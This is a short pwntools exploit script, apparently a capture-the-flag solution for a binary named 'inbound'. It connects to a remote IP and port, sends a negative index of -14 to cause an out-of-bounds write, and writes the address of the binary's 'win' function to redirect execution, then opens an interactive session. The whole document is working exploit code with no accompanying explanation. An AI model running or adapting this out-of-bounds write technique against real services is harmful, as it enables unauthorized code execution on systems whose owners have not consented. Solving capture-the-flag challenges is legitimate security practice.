from pwn import *

elf = ELF("./inbound")

p = remote("34.170.146.252", 42647)

p.sendlineafter(b"index: ", b"-14")

win_addr = elf.symbols["win"]

p.sendlineafter(b"value: ", str(win_addr).encode())

p.interactive()
